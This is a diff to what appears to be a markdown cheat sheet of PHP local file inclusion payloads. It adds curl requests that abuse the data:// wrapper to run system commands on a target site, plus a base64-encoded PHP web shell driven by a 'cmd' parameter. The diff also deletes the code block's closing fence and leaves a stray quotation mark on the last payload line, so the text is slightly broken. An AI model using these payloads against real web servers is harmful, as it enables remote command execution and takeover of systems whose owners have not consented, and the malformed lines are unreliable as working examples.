@@ -33,7 +33,9 @@ Examples:
 ```
 curl http://site/index.php?page=php://filter/resource=somepage.php
 curl http://site/index.php?page=php://filter/convert.base64-encode/resource=somepage.php
-```
+curl http://site/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>
+echo -n '<?php echo system($_GET["cmd"]);?>' | base64
+curl http://site/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
 
 ### Remote file inclusion
 
